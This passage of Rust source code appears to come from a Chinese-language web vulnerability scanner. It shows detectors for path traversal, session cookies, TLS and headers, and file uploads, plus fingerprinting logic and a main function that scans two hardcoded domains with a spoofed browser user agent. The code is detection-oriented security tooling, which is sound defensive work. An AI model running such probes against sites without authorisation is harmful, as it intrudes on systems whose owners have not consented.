                                    "1. 使用白名单验证文件路径；\n2. 将文件路径限制在指定目录内（chroot或路径规范化后检查前缀）；\n3. 禁止路径中包含..和绝对路径；\n4. 使用文件ID映射替代直接路径传递。",
                                    "1. 重新测试确认../等遍历序列被拒绝；\n2. 验证只能访问允许目录下的文件。",
                                    9.1,
                                ).with_payload(payload).with_proof(&proof).with_status(status).with_param(param);
                                vulns.push(v);
                                warn!("[目录遍历] 发现漏洞: {}={}", param, payload);
                                break;
                            }
                        }
                    }
                    Err(e) => debug!("[目录遍历] 请求失败: {}", e),
                }
            }
        }

        Ok(vulns)
    }
}

// ==================== 8. 会话管理检测器 ====================

struct SessionManagementDetector;

#[async_trait]
impl Detector for SessionManagementDetector {
    fn name(&self) -> &str { "会话管理检测器" }

    async fn scan(&self, target: &str, client: &Client, baseline: &BaselineData) -> Result<Vec<Vulnerability>, String> {
        let mut vulns = Vec::new();
        let base_url = normalize_url(target);

        info!("[会话管理] 开始检测");

        // 检查Cookie安全性
        for cookie in &baseline.cookies {
            // 会话ID在URL中传递
            if cookie.contains("PHPSESSID") || cookie.contains("JSESSIONID") || cookie.contains("ASP.NET_SessionId") || cookie.contains("sid") || cookie.contains("session") {
                if !cookie.to_lowercase().contains("httponly") {
                    vulns.push(Vulnerability::new(
                        "会话管理", Severity::Medium,
                        "会话Cookie缺少HttpOnly属性",
                        &base_url,
                        "会话Cookie未设置HttpOnly属性，JavaScript可通过document.cookie读取会话ID，结合XSS漏洞可导致会话劫持。",
                        "HttpOnly属性是Cookie安全的基础设置。缺失时，任何XSS漏洞都可直接导致会话令牌泄露。这是OWASP会话管理十大缺陷之一。",
                        "设置Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict",
                        "浏览器DevTools中检查Cookie的HttpOnly列是否勾选。",
                        5.0,
                    ));
                }
                if !cookie.to_lowercase().contains("secure") {
                    vulns.push(Vulnerability::new(
                        "会话管理", Severity::High,
                        "会话Cookie缺少Secure属性",
                        &base_url,
                        "会话Cookie未设置Secure属性，可能在非加密HTTP连接中传输，存在被网络嗅探窃取的风险。",
                        "未设置Secure属性的Cookie会在所有连接中传输。攻击者通过中间人攻击或网络嗅探（如公共WiFi）即可截获会话令牌。",
                        "设置Set-Cookie: session=xxx; Secure; HttpOnly; SameSite=Strict",
                        "确认HTTPS响应的Set-Cookie包含Secure属性。",
                        6.0,
                    ));
                }
            }

            // 检查会话固定
            if cookie.contains("Path=/") && !cookie.contains("Domain") {
                info!("[会话管理] Cookie作用域检查通过");
            }
        }

        // 检查会话超时（通过两次请求间隔检查Cookie是否变化）
        if !baseline.cookies.is_empty() {
            // 检查登录页是否存在
            let login_paths = ["/login", "/admin", "/user/login", "/auth", "/signin"];
            for path in &login_paths {
                let url = format!("{}/{}", base_url.trim_end_matches('/'), path);
                if let Ok(resp) = client.get(&url).timeout(Duration::from_secs(5)).send().await {
                    if resp.status().as_u16() == 200 {
                        let body = resp.text().await.unwrap_or_default();
                        if body.to_lowercase().contains("password") || body.to_lowercase().contains("密码") {
                            // 检查是否有密码强度提示
                            if !body.to_lowercase().contains("captcha") && !body.to_lowercase().contains("验证码") {
                                vulns.push(Vulnerability::new(
                                    "访问控制", Severity::Low,
                                    &format!("登录页缺少验证码保护 ({})", path),
                                    &url,
                                    "登录表单未发现验证码机制，可能遭受暴力破解攻击。",
                                    "登录页面缺少CAPTCHA验证码，攻击者可使用自动化工具进行密码暴力破解。验证码是防止凭证 stuffing和暴力破解的有效手段。",
                                    "1. 在登录表单添加CAPTCHA验证码；\n2. 实施账户锁定策略（连续失败5次锁定30分钟）；\n3. 限制单IP登录尝试频率；\n4. 启用多因素认证(MFA)。",
                                    "1. 确认登录页包含验证码；\n2. 测试连续失败登录是否触发锁定。",
                                    4.0,
                                ));
                            }
                        }
                    }
                }
            }
        }

        Ok(vulns)
    }
}

// ==================== 9. TLS/加密检测器 ====================

struct TlsCryptoDetector;

#[async_trait]
impl Detector for TlsCryptoDetector {
    fn name(&self) -> &str { "TLS/加密检测器" }

    async fn scan(&self, target: &str, _client: &Client, baseline: &BaselineData) -> Result<Vec<Vulnerability>, String> {
        let mut vulns = Vec::new();
        let base_url = normalize_url(target);

        info!("[TLS/加密] 开始检测");

        // 检查HTTPS
        if !base_url.starts_with("https") {
            vulns.push(Vulnerability::new(
                "加密传输", Severity::High,
                "未使用HTTPS加密传输",
                &base_url,
                "网站未启用HTTPS加密，所有数据以明文传输，包括登录凭证、会话Cookie等敏感信息。",
                "HTTP协议不提供加密，网络中的任何节点（ISP、路由器、WiFi热点）都可截获传输内容。这在OWASP A02:2021-Cryptographic Failures中列为高风险。",
                "1. 申请SSL/TLS证书（推荐Let's Encrypt免费证书）；\n2. 配置Nginx/Apache启用HTTPS；\n3. 设置HTTP到HTTPS的301重定向；\n4. 配置HSTS头部。",
                "1. 确认网站通过HTTPS访问；\n2. 使用ssllabs.com进行SSL评级（目标A级）。",
                7.5,
            ));
        } else {
            // 检查HSTS
            let has_hsts = baseline.headers.iter().any(|(k, _)| k.eq_ignore_ascii_case("Strict-Transport-Security"));
            if !has_hsts {
                vulns.push(Vulnerability::new(
                    "加密传输", Severity::Medium,
                    "缺少HSTS头部",
                    &base_url,
                    "已启用HTTPS但未配置HSTS头部，用户首次访问或手动输入HTTP URL时可能遭受SSL剥离攻击。",
                    "HSTS（HTTP Strict Transport Security）通过响应头告知浏览器始终使用HTTPS连接。缺少HSTS时，中间人可在首次访问时降级为HTTP。",
                    "添加响应头: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
                    "使用curl -I确认HSTS头部存在。在ssllabs.com检查HSTS状态。",
                    5.5,
                ));
            }
        }

        // 检查是否暴露敏感头部信息
        for (key, value) in &baseline.headers {
            if key.eq_ignore_ascii_case("server") {
                if value.contains("/") || value.contains("(") {
                    vulns.push(Vulnerability::new(
                        "信息泄露", Severity::Low,
                        &format!("服务器版本信息暴露: {}", value),
                        &base_url,
                        &format!("Server头部暴露了详细的服务器版本信息（{}），攻击者可针对已知漏洞进行利用。", value),
                        "服务器响应头中包含详细版本号，攻击者可通过版本信息查找对应的已知漏洞和利用代码。",
                        "1. 配置server_tokens off（Nginx）或ServerTokens Prod（Apache）；\n2. 移除版本号信息。",
                        "确认Server头部不再包含版本号。",
                        3.0,
                    ).with_status(baseline.status));
                }
            }
            if key.eq_ignore_ascii_case("x-powered-by") {
                vulns.push(Vulnerability::new(
                    "信息泄露", Severity::Low,
                    &format!("技术栈信息暴露: {}", value),
                    &base_url,
                    &format!("X-Powered-By头部暴露了后端技术栈（{}），便于攻击者针对性利用。", value),
                    "X-Powered-By头部泄露了后端框架/语言信息，攻击者可据此选择对应的攻击载荷。",
                    "1. 移除X-Powered-By头部（PHP: expose_php = Off）；\n2. 配置反向代理移除该头部。",
                    "确认响应头中不再包含X-Powered-By。",
                    2.5,
                ).with_status(baseline.status));
            }
        }

        Ok(vulns)
    }
}

// ==================== 10. 文件上传检测器 ====================

struct FileUploadDetector;

#[async_trait]
impl Detector for FileUploadDetector {
    fn name(&self) -> &str { "文件上传检测器" }

    async fn scan(&self, target: &str, client: &Client, baseline: &BaselineData) -> Result<Vec<Vulnerability>, String> {
        let mut vulns = Vec::new();
        let base_url = normalize_url(target);

        info!("[文件上传] 开始检测");

        let body = &baseline.body;
        // 先完成所有Html解析操作，提取所需数据后再进入await
        let (has_file_upload, upload_action_url, has_accept) = {
            let document = Html::parse_document(body);
            let mut file_input_info: Option<(String, bool)> = None;
            if let Ok(sel) = Selector::parse("input[type='file']") {
                if let Some(file_input) = document.select(&sel).next() {
                    let accept = file_input.value().attr("accept").is_some();
                    if let Ok(form_sel) = Selector::parse("form") {
                        if let Some(form) = document.select(&form_sel).next() {
                            let action = form.value().attr("action").unwrap_or("/upload");
                            let action_url = if action.starts_with("http") { action.to_string() }
                                else { format!("{}/{}", base_url.trim_end_matches('/'), action) };
                            file_input_info = Some((action_url, accept));
                        }
                    }
                }
            }
            file_input_info.map(|(url, accept)| (true, url, accept)).unwrap_or((false, String::new(), false))
        };

        if has_file_upload && !has_accept {
            let v = Vulnerability::new(
                "文件上传", Severity::High,
                "文件上传缺少类型限制",
                &upload_action_url,
                "文件上传表单未设置文件类型限制（accept属性），攻击者可能上传恶意脚本文件（如PHP/JSP webshell）获取服务器控制权。",
                "HTML input[type=file]缺少accept属性限制文件类型。如果服务端也未正确验证文件类型，攻击者可上传webshell实现远程代码执行。",
                "1. 前端添加accept属性限制文件类型；\n2. 服务端验证文件扩展名、MIME类型和文件内容；\n3. 上传文件存储在Web根目录外；\n4. 上传目录禁用脚本执行；\n5. 重命名上传文件；\n6. 限制文件大小。",
                "1. 尝试上传.php文件确认被拒绝；\n2. 检查服务端文件类型验证逻辑。",
                7.0,
            );
            vulns.push(v);
            warn!("[文件上传] 发现无类型限制的上传表单");
        }

        // 检查上传目录是否可访问
        let upload_paths = ["upload/", "uploads/", "files/", "media/", "static/upload/"];
        for path in &upload_paths {
            let url = format!("{}/{}", base_url.trim_end_matches('/'), path);
            if let Ok(resp) = client.get(&url).timeout(Duration::from_secs(5)).send().await {
                let status = resp.status().as_u16();
                if status == 200 {
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains("Index of") || body.contains("Directory listing") {
                        let v = Vulnerability::new(
                            "文件上传", Severity::Medium,
                            &format!("上传目录开启目录浏览: {}", path),
                            &url,
                            &format!("上传目录 '{}' 开启了目录列表功能，攻击者可浏览和下载所有上传文件。", path),
                            "Web服务器配置允许目录浏览（autoindex on），攻击者可直接查看和下载上传的所有文件，可能包含其他用户上传的敏感文件。",
                            "1. 关闭目录浏览（Nginx: autoindex off; Apache: Options -Indexes）；\n2. 限制上传目录的访问权限。",
                            "重新访问上传目录应返回403或空白页面。",
                            5.0,
                        ).with_status(status);
                        vulns.push(v);
                    }
                }
            }
        }

        Ok(vulns)
    }
}

// ==================== 辅助函数 ====================

fn normalize_url(target: &str) -> String {
    if target.starts_with("http") { target.to_string() } else { format!("https://{}", target) }
}

fn extract_context(body: &str, pattern: &str, context_len: usize) -> String {
    if let Some(idx) = body.find(pattern) {
        let start = idx.saturating_sub(context_len / 2);
        let end = (idx + pattern.len() + context_len / 2).min(body.len());
        let prefix = if start > 0 { "..." } else { "" };
        let suffix = if end < body.len() { "..." } else { "" };
        format!("{}{}{}", prefix, &body[start..end], suffix)
    } else {
        body.chars().take(300).collect()
    }
}

fn simple_hash(s: &str) -> u64 {
    let mut hash: u64 = 5381;
    for byte in s.bytes() {
        hash = hash.wrapping_mul(33).wrapping_add(byte as u64);
    }
    hash
}

fn extract_host(url: &str) -> String {
    let stripped = url.strip_prefix("https://").or_else(|| url.strip_prefix("http://")).unwrap_or(url);
    stripped.split('/').next().unwrap_or(stripped).to_string()
}

// ==================== 技术指纹收集 ====================

async fn collect_fingerprint(target: &str, client: &Client) -> Result<(TechFingerprint, BaselineData), String> {
    let base_url = normalize_url(target);
    let resp = client.get(&base_url).timeout(Duration::from_secs(10)).send().await
        .map_err(|e| format!("连接失败: {}", e))?;

    let status = resp.status().as_u16();
    let headers = resp.headers();
    let mut header_list: Vec<(String, String)> = Vec::new();
    let mut fp = TechFingerprint { status_code: status, tls_enabled: base_url.starts_with("https"), ..Default::default() };

    for (name, value) in headers.iter() {
        if let Ok(v) = value.to_str() {
            header_list.push((name.to_string(), v.to_string()));
            match name.as_str() {
                "server" => { fp.server = Some(v.to_string()); fp.technologies.push(format!("Server: {}", v)); }
                "x-powered-by" => { fp.powered_by = Some(v.to_string()); fp.technologies.push(format!("Powered-By: {}", v)); }
                "strict-transport-security" => fp.hsts_enabled = true,
                _ => {}
            }
        }
    }

    // Cookie收集
    let cookies: Vec<String> = headers.get_all("set-cookie").iter()
        .filter_map(|v| v.to_str().ok().map(|s| s.to_string()))
        .collect();
    fp.cookies = cookies.clone();

    let body = resp.text().await.unwrap_or_default();
    fp.content_length = body.len();
    let body_lower = body.to_lowercase();

    let document = Html::parse_document(&body);
    if let Ok(sel) = Selector::parse("title") {
        if let Some(el) = document.select(&sel).next() {
            fp.page_title = Some(el.text().collect::<String>());
        }
    }
    if let Ok(sel) = Selector::parse(r#"meta[name="generator"]"#) {
        if let Some(el) = document.select(&sel).next() {
            if let Some(content) = el.value().attr("content") {
                fp.meta_generator = Some(content.to_string());
                fp.technologies.push(format!("Generator: {}", content));
            }
        }
    }

    let tech_patterns: &[(&str, &str)] = &[
        ("WordPress", "wp-content"), ("React", "react"), ("Vue.js", "vue"),
        ("Angular", "angular"), ("jQuery", "jquery"), ("Bootstrap", "bootstrap"),
        ("Laravel", "laravel"), ("Django", "django"), ("Spring", "spring"),
        ("Express", "express"), ("Nginx", "nginx"), ("Apache", "apache"),
        ("PHP", ".php"), ("ASP.NET", "asp.net"), ("Next.js", "__next"),
        ("Nuxt.js", "nuxt"), ("Three.js", "three.js"), ("Tailwind", "tailwind"),
    ];
    for (tech, pat) in tech_patterns {
        if body_lower.contains(pat) { fp.technologies.push(tech.to_string()); }
    }

    let baseline = BaselineData { body, status, headers: header_list.clone(), cookies, content_length: fp.content_length };
    fp.response_headers = header_list;
    Ok((fp, baseline))
}

// ==================== 主函数 ====================

#[derive(Debug, Clone, Serialize)]
struct TargetScanResult {
    target: String,
    fingerprint: TechFingerprint,
    vulnerabilities: Vec<Vulnerability>,
    scan_duration_secs: f64,
    critical: usize,
    high: usize,
    medium: usize,
    low: usize,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt().with_max_level(tracing::Level::INFO).with_target(false).init();

    let targets = vec!["ljbljb.com", "ljblib.xyz"];
    info!("===========================================================");
    info!("  VulScan Pro v0.3 - 多目标全栈安全漏洞扫描工具");
    info!("  目标: {} ({:}个)", targets.join(", "), targets.len());
    info!("  扫描范围: SQL注入|XSS|CSRF|命令注入|目录遍历|敏感文件|");
    info!("            安全头部|会话管理|TLS加密|文件上传");
    info!("  原则: 只检测，不利用（仅发送无害验证型请求）");
    info!("  扫描速率: ≤10 req/s 每目标");
    info!("===========================================================");

    let client = ClientBuilder::new()
        .connect_timeout(Duration::from_secs(5))
        .timeout(Duration::from_secs(10))
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .build()
        .expect("Failed to build HTTP client");

    let client = Arc::new(client);
    let global_start = std::time::Instant::now();
    let mut all_results: Vec<TargetScanResult> = Vec::new();

    for (idx, target) in targets.iter().enumerate() {
        println!("\n{}", "=".repeat(70));
        info!("[目标 {}/{}] 开始扫描: {}", idx + 1, targets.len(), target);

        let target_start = std::time::Instant::now();

        // 1. 技术指纹
        info!("  [1/10] 技术指纹识别...");
        let (fp, baseline) = match collect_fingerprint(target, &client).await {
            Ok(r) => r,
            Err(e) => {
                warn!("  无法连接目标 {}: {}, 跳过", target, e);
                continue;
            }
        };
        info!("    页面标题: {:?}", fp.page_title);
        info!("    Web服务器: {:?}", fp.server);
        info!("    技术栈: {:?}", fp.technologies.join(", "));
        info!("    HTTP状态码: {}", fp.status_code);
        info!("    页面大小: {} bytes", fp.content_length);
        info!("    TLS加密: {}", fp.tls_enabled);
        info!("    HSTS: {}", fp.hsts_enabled);

        // 初始化检测器
        let detectors: Vec<Box<dyn Detector>> = vec![
            Box::new(SqlInjectionDetector),
            Box::new(XssDetector),
            Box::new(CsrfDetector),
            Box::new(SensitiveFileDetector),
            Box::new(SecurityHeaderDetector),
            Box::new(CommandInjectionDetector),
            Box::new(DirectoryTraversalDetector),
            Box::new(SessionManagementDetector),
            Box::new(TlsCryptoDetector),
            Box::new(FileUploadDetector),
        ];

        let mut all_vulns: Vec<Vulnerability> = Vec::new();

        for (i, detector) in detectors.iter().enumerate() {
            info!("  [{}/{}] {} 执行中...", i + 2, detectors.len() + 1, detector.name());
            match detector.scan(target, &client, &baseline).await {
                Ok(vulns) => {
                    info!("    {} 结果: 发现 {} 个漏洞", detector.name(), vulns.len());
                    all_vulns.extend(vulns);
                }
                Err(e) => warn!("    {} 错误: {}", detector.name(), e),
            }
        }

        let elapsed = target_start.elapsed();

        // 排序
        all_vulns.sort_by(|a, b| {
            let ord = |s: &str| -> u8 { match s { "严重" => 0, "高危" => 1, "中危" => 2, "低危" => 3, _ => 4 } };
            ord(&a.severity).cmp(&ord(&b.severity)).then_with(|| b.risk_score.partial_cmp(&a.risk_score).unwrap_or(std::cmp::Ordering::Equal))
        });

        let critical = all_vulns.iter().filter(|v| v.severity == "严重").count();
        let high = all_vulns.iter().filter(|v| v.severity == "高危").count();
        let medium = all_vulns.iter().filter(|v| v.severity == "中危").count();
        let low = all_vulns.iter().filter(|v| v.severity == "低危").count();

        info!("  --- {} 扫描完成 ---", target);
        info!("  耗时: {:.1}秒 | 严重={} 高危={} 中危={} 低危={} 总计={}",
            elapsed.as_secs_f64(), critical, high, medium, low, all_vulns.len());

        // 输出发现的漏洞摘要
        for v in &all_vulns {
            let level_icon = match v.severity.as_str() { "严重" => "!!", "高危" => "! ", "中危" => "~ ", _ => "  " };
            println!("    {} [{}] {} ({}, CVSS:{:.1}) {}",
                level_icon, v.detector, v.title, v.severity, v.risk_score, v.owasp_category);
        }

        all_results.push(TargetScanResult {
            target: target.to_string(),
            fingerprint: fp,
            vulnerabilities: all_vulns,
            scan_duration_secs: elapsed.as_secs_f64(),
            critical, high, medium, low,
        });
    }

    let total_elapsed = global_start.elapsed();
    let total_vulns: usize = all_results.iter().map(|r| r.vulnerabilities.len()).sum();
    let total_critical: usize = all_results.iter().map(|r| r.critical).sum();
    let total_high: usize = all_results.iter().map(|r| r.high).sum();
    let total_medium: usize = all_results.iter().map(|r| r.medium).sum();
    let total_low: usize = all_results.iter().map(|r| r.low).sum();

    println!("\n{}", "=".repeat(70));
    println!("  VulScan Pro v0.3 - 综合扫描报告摘要");
    println!("{}", "=".repeat(70));
    println!("  扫描时间: {}", Utc::now().format("%Y-%m-%d %H:%M:%S UTC"));
    println!("  总耗时: {:.1}秒", total_elapsed.as_secs_f64());
    println!("  目标数量: {}", all_results.len());
    println!("{}", "-".repeat(70));
    println!("  综合漏洞统计: 严重={} 高危={} 中危={} 低危={} 总计={}",
        total_critical, total_high, total_medium, total_low, total_vulns);
    println!("{}", "-".repeat(70));

    for result in &all_results {
        println!("  [{}] 严重={} 高危={} 中危={} 低危={} 总计={} (耗时{:.1}s)",
            result.target, result.critical, result.high, result.medium, result.low,
            result.vulnerabilities.len(), result.scan_duration_secs);
    }
    println!("{}", "=".repeat(70));

    // 保存综合JSON报告
    let report = serde_json::json!({
        "report_version": "V1.0",
        "report_date": Utc::now().format("%Y-%m-%d").to_string(),
        "scan_date": Utc::now().to_rfc3339(),
        "scanner_version": "0.3.0",
        "total_scan_duration_secs": total_elapsed.as_secs_f64(),
        "targets_scanned": all_results.len(),
        "global_summary": {
            "total_vulnerabilities": total_vulns,
            "critical": total_critical,
            "high": total_high,
            "medium": total_medium,
            "low": total_low,
            "overall_risk": if total_critical > 0 { "极高" } else if total_high > 0 { "高" } else if total_medium > 0 { "中" } else { "低" },
        },
        "target_results": all_results.iter().map(|r| serde_json::json!({
            "target": r.target,
            "scan_duration_secs": r.scan_duration_secs,
            "fingerprint": r.fingerprint,
            "vulnerabilities": r.vulnerabilities,
            "summary": {
                "total": r.vulnerabilities.len(),
                "critical": r.critical,
                "high": r.high,
                "medium": r.medium,
                "low": r.low,
                "risk_level": if r.critical > 0 { "极高" } else if r.high > 0 { "高" } else if r.medium > 0 { "中" } else { "低" },
            }
        })).collect::<Vec<_>>(),
    });

    let report_path = r"c:\Users\A2681\Desktop\Rust+Recat\scan-report-dual-targets.json";
    match serde_json::to_string_pretty(&report) {
        Ok(json) => match std::fs::write(report_path, &json) {
            Ok(_) => info!("综合报告已保存至: {}", report_path),
            Err(e) => error!("保存报告失败: {}", e),
        },
        Err(e) => error!("JSON序列化失败: {}", e),
    }
}
